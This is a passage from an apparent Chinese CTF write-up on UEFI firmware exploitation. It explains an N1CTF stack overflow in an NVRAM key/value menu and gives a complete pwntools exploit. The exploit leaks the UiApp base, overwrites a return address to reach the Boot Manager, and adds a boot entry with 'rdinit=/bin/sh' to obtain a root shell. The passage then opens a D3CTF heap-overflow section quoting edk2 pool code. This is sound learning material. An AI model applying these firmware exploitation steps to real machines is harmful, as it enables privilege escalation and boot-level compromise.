<h3 id="漏洞分析与利用"><a href="#漏洞分析与利用" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h3><p>这里先解释各个函数做了什么：<br>1、Add：利用 SetVariable 将用户自定义的 (key, value) 写入 NVRAM 中<br>2、Delete：利用 SetVariable 将 NVRAM 中指定的 key 的 value 清空<br>3、Get：用 GetVariable 获取 NVRAM 中指定 key 的 value 并打印<br>4、Encode：利用 GetVariable 获取 NVRAM 中指定 key 的 value 并存储在 Data_1 中，根据 Data_1 的长度用 GetVariable 将 NVRAM 中 N1CTF_KEY(1&#x2F;2&#x2F;3) 对应的 value 存储在 Data_2 中，并将 Data_1 和 Data_2 进行亦或，最后将最终的 Data_1 通过 SetVariable 存储回 NVRAM 中。  </p>
<p>这里需要注意的是根据 Data_1 的长度用 GetVariable 将 NVRAM 中 N1CTF_KEY(1&#x2F;2&#x2F;3) 对应的 value 存储在 Data_2 中这一步，他是在一个 for 循环中进行的，而且在上一次循环结束后下一次循环开始时并没有对 DataSize 的值进行初始化。<br>我们知道在调用 GetVariable 时 DataSize 会被设置为 NVRAM 中读取的 value 的长度，如果我们能够设置 N1CTF_KEY1 的 value 长度很长，那么我们在用 GetVariable 获取 N1CTF_KEY2 的 value 时就会在 Data_2 上发生栈溢出，而 N1CTF_KEY 的 value 值我们可以通过 Add 函数进行设置。  </p>
<p>接下来我们面临着两个问题：<br>1、如何获取 UiApp 固件的基址<br>2、栈溢出后我们要劫持到哪里</p>
<h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>在 Add 的时候，如果我们的 value 长度刚好为 256，那么我们在 Get 的时候会带出后面的一些数据，原理应该和用户态的 puts 函数类似，通过 \x00 截断输出，value 的数组长度为 256，而且后面刚好跟着一个地址对象，所以把 \x00 填满后就能够将其带出来，通过分析这个地址和 UiApp 的基址偏移是固定的。<br>在 gdb 中获取 UiApp 方式和我们上一篇文章 <a target="_blank" rel="noopener" href="https://9anux.org/2024/12/14/uefi/#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2">DubheCTF 2024 ToySMM</a> 中获取后门函数的地址方式是一样的，都是直接在 gdb 中搜索代码的 text 段的十六进制串。  </p>
<h3 id="执行流的劫持"><a href="#执行流的劫持" class="headerlink" title="执行流的劫持"></a>执行流的劫持</h3><p>这里我们交叉引用我们的 vuln 函数找到调用它的地方： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( vuln() )</span><br><span class="line">&#123;</span><br><span class="line">  Output(<span class="string">&quot;No No No!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x8000000000000003</span>ui64;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_23A4(<span class="number">0</span>);</span><br><span class="line">  sub_11A4();</span><br><span class="line">  sub_2645();</span><br><span class="line">  sub_C6B3(v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而我们的 vuln 函数的返回值是 0x8000000000000003ui64，所以不难猜测 else 分支就是进入 Boot Manager，所以将返回地址劫持到该 else 分支即可进入到 Boot Manager 界面：  </p>
<img src="/2025/01/06/uefi2/2.png" class="" title="我的图图呢">  

<p>最后在 Boot Manager 中加入自己的启动项使用 root 启动系统即可。  </p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>由于 Boot Manager 是可视化界面，在 pwntools 上非常难看，所以这里使用 socat 连接。</p>
<h4 id="exp-sh"><a href="#exp-sh" class="headerlink" title="exp.sh"></a>exp.sh</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">socat $(<span class="built_in">tty</span>),<span class="built_in">echo</span>=0,escape=0x03 SYSTEM:<span class="string">&#x27;python3 ./exp.py&#x27;</span> 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h4 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;python3&#x27;</span>,<span class="string">&#x27;run.py&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,value</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Key name:&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;value&#x27;</span>)</span><br><span class="line">    p.sendline(value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addSend</span>(<span class="params">name,value</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Key name:&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;value&#x27;</span>)</span><br><span class="line">    p.send(value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">name</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Key name:&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">name</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Key name:&#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line">key_map = &#123;</span><br><span class="line">    <span class="string">b&quot;up&quot;</span>:    <span class="string">b&quot;\x1b[A&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;down&quot;</span>:  <span class="string">b&quot;\x1b[B&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;left&quot;</span>:  <span class="string">b&quot;\x1b[D&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;right&quot;</span>: <span class="string">b&quot;\x1b[C&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;esc&quot;</span>:   <span class="string">b&quot;\x1b^[&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;enter&quot;</span>: <span class="string">b&quot;\r&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;tab&quot;</span>:   <span class="string">b&quot;\t&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_key</span>(<span class="params">key,times = <span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        p.send(key_map[key])</span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">b&quot;enter&quot;</span>:</span><br><span class="line">            p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;\x1b[24~&quot;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">addSend(<span class="string">b&#x27;leak&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">256</span>)</span><br><span class="line">get(<span class="string">b&#x27;leak&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">256</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>)</span><br><span class="line">leak, i, j = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data):</span><br><span class="line">    <span class="keyword">if</span> data[i] == <span class="built_in">ord</span>(<span class="string">b&quot;\\&quot;</span>):</span><br><span class="line">        n = <span class="built_in">int</span>(data[i+<span class="number">2</span>:i+<span class="number">4</span>], <span class="number">16</span>)</span><br><span class="line">        i += <span class="number">4</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        n = data[i]</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    leak += n * (<span class="number">0x100</span>**j)</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">uiapp_base = leak - <span class="number">0x1e009c0</span></span><br><span class="line">boot = uiapp_base + <span class="number">0x235A</span></span><br><span class="line">lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;uiapp_base&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;boot&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p32(boot)</span><br><span class="line">add(<span class="string">b&quot;N1CTF_KEY1&quot;</span>, payload)</span><br><span class="line">add(<span class="string">b&quot;N1CTF_KEY2&quot;</span>, payload)</span><br><span class="line">add(<span class="string">b&quot;win&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">encode(<span class="string">b&#x27;win&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Standard PC&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;\rrootshell\r&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;\rconsole=ttyS0 initrd=rootfs.img rdinit=/bin/sh quiet\r&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;up&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;esc&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>效果如下：  </p>
<img src="/2025/01/06/uefi2/3.png" class="" title="我的图图呢">  

<h2 id="Heap-OverFlow"><a href="#Heap-OverFlow" class="headerlink" title="Heap OverFlow"></a>Heap OverFlow</h2><p>这里用的环境是 D3CTF 2022 d3guard，这道题目当时是 0 解，而且涉及到很多比较冷门的知识点，笔者觉得这题出得非常的硬核，学到了非常多的东西Orz  </p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>和上一道题目一样，运行 run.py 后获得的是一个低权限的 shell，需要我们提权后才能够获取 flag。在启动 qemu 的时候我们按 f12 就能够进入到出题人自己实现的交互界面。  </p>
<img src="/2025/01/06/uefi2/5.png" class="" title="我的图图呢">  

<p>不难想到漏洞就出现在这个地方，在 IDA 中进行字符串的搜索考研很快的定位到这部分的功能由 UiApp 组件实现。由于这道题涉及到 UEFI 的堆管理系统，所以下面就先简单的介绍一下 UEFI 的堆。</p>
<h3 id="堆块的管理"><a href="#堆块的管理" class="headerlink" title="堆块的管理"></a>堆块的管理</h3><p>如果想知道详细的过程请读者自行去看<a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2/blob/master/MdeModulePkg/Core/Dxe/Mem/Pool.c">源码</a>，这里我只简单的总结一下分配的堆块没有很大的情况，而且忽略了很多细节（比如堆块合并）。  </p>
<p>在 UEFI 中存在一个 mPoolHead 数组用于存储 POOL 结构体，该数组的每一个索引对应着不同 EfiMemoryType 类型的 POOL，相关代码如下：  </p>
<p><strong>POOL</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  INTN               Signature;</span><br><span class="line">  UINTN              Used;</span><br><span class="line">  EFI_MEMORY_TYPE    MemoryType;</span><br><span class="line">  LIST_ENTRY         FreeList[MAX_POOL_LIST];</span><br><span class="line">  LIST_ENTRY         Link;</span><br><span class="line">&#125; POOL;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Pool header for each memory type.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">POOL  mPoolHead[EfiMaxMemoryType];</span><br><span class="line"></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// LIST_ENTRY structure definition.</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">LIST_ENTRY</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// _LIST_ENTRY structure definition.</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">  LIST_ENTRY    *ForwardLink;</span><br><span class="line">  LIST_ENTRY    *BackLink;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>EfiMemoryType</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// Enumeration of memory types introduced in UEFI.</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Not used.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiReservedMemoryType,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The code portions of a loaded application.</span></span><br><span class="line">  <span class="comment">/// (Note that UEFI OS loaders are UEFI applications.)</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiLoaderCode,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The data portions of a loaded application and the default data allocation</span></span><br><span class="line">  <span class="comment">/// type used by an application to allocate pool memory.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiLoaderData,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The code portions of a loaded Boot Services Driver.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiBootServicesCode,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The data portions of a loaded Boot Serves Driver, and the default data</span></span><br><span class="line">  <span class="comment">/// allocation type used by a Boot Services Driver to allocate pool memory.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiBootServicesData,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The code portions of a loaded Runtime Services Driver.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiRuntimeServicesCode,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The data portions of a loaded Runtime Services Driver and the default</span></span><br><span class="line">  <span class="comment">/// data allocation type used by a Runtime Services Driver to allocate pool memory.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiRuntimeServicesData,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Free (unallocated) memory.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiConventionalMemory,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Memory in which errors have been detected.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiUnusableMemory,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Memory that holds the ACPI tables.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiACPIReclaimMemory,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Address space reserved for use by the firmware.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiACPIMemoryNVS,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Used by system firmware to request that a memory-mapped IO region</span></span><br><span class="line">  <span class="comment">/// be mapped by the OS to a virtual address so it can be accessed by EFI runtime services.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiMemoryMappedIO,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// System memory-mapped IO region that is used to translate memory</span></span><br><span class="line">  <span class="comment">/// cycles to IO cycles by the processor.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiMemoryMappedIOPortSpace,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Address space reserved by the firmware for code that is part of the processor.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiPalCode,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// A memory region that operates as EfiConventionalMemory,</span></span><br><span class="line">  <span class="comment">/// however it happens to also support byte-addressable non-volatility.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiPersistentMemory,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// A memory region that describes system memory that has not been accepted</span></span><br><span class="line">  <span class="comment">/// by a corresponding call to the underlying isolation architecture.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiUnacceptedMemoryType,</span><br><span class="line">  EfiMaxMemoryType,</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// +---------------------------------------------------+</span></span><br><span class="line">  <span class="comment">// | 0..(EfiMaxMemoryType - 1)    - Normal memory type |</span></span><br><span class="line">  <span class="comment">// +---------------------------------------------------+</span></span><br><span class="line">  <span class="comment">// | EfiMaxMemoryType..0x6FFFFFFF - Invalid            |</span></span><br><span class="line">  <span class="comment">// +---------------------------------------------------+</span></span><br><span class="line">  <span class="comment">// | 0x70000000..0x7FFFFFFF       - OEM reserved       |</span></span><br><span class="line">  <span class="comment">// +---------------------------------------------------+</span></span><br><span class="line">  <span class="comment">// | 0x80000000..0xFFFFFFFF       - OS reserved        |</span></span><br><span class="line">  <span class="comment">// +---------------------------------------------------+</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  MEMORY_TYPE_OEM_RESERVED_MIN = <span class="number">0x70000000</span>,</span><br><span class="line">  MEMORY_TYPE_OEM_RESERVED_MAX = <span class="number">0x7FFFFFFF</span>,</span><br><span class="line">  MEMORY_TYPE_OS_RESERVED_MIN  = <span class="number">0x80000000</span>,</span><br><span class="line">  MEMORY_TYPE_OS_RESERVED_MAX  = <span class="number">0xFFFFFFFF</span></span><br><span class="line">&#125; EFI_MEMORY_TYPE;</span><br></pre></td></tr></table></figure>

<p>在每个 POOL 结构体中有一个 FreeList 数组用于存储被释放的堆块双向链表，类似于 ptmalloc 中 unosrtedbin &#x2F; smallbin &#x2F; largebin，不过遵循后进先出。当某个 FreeList 为空时 ForwardLink 和 BackLink 指向该 FreeList 自身，FreeList 的初始化代码如下：    </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Called to initialize the pool.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line">VOID</span><br><span class="line"><span class="title function_">CoreInitializePool</span> <span class="params">(</span></span><br><span class="line"><span class="params">  VOID</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  UINTN  Type;</span><br><span class="line">  UINTN  Index;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (Type = <span class="number">0</span>; Type &lt; EfiMaxMemoryType; Type++) &#123;</span><br><span class="line">    mPoolHead[Type].Signature  = <span class="number">0</span>;</span><br><span class="line">    mPoolHead[Type].Used       = <span class="number">0</span>;</span><br><span class="line">    mPoolHead[Type].MemoryType = (EFI_MEMORY_TYPE)Type;</span><br><span class="line">    <span class="keyword">for</span> (Index = <span class="number">0</span>; Index &lt; MAX_POOL_LIST; Index++) &#123;</span><br><span class="line">      InitializeListHead (&amp;mPoolHead[Type].FreeList[Index]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Initializes the head node of a doubly-linked list, and returns the pointer to</span></span><br><span class="line"><span class="comment">  the head node of the doubly-linked list.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Initializes the forward and backward links of a new linked list. After</span></span><br><span class="line"><span class="comment">  initializing a linked list with this function, the other linked list</span></span><br><span class="line"><span class="comment">  functions may be used to add and remove nodes from the linked list. It is up</span></span><br><span class="line"><span class="comment">  to the caller of this function to allocate the memory for ListHead.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  If ListHead is NULL, then ASSERT().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @param  ListHead  A pointer to the head node of a new doubly-linked list.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @return ListHead</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line">LIST_ENTRY *</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">InitializeListHead</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN OUT  LIST_ENTRY  *ListHead</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  ASSERT (ListHead != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  ListHead-&gt;ForwardLink = ListHead;</span><br><span class="line">  ListHead-&gt;BackLink    = ListHead;</span><br><span class="line">  <span class="keyword">return</span> ListHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>FreeList 的每个下标对应着不同的 size  </p>
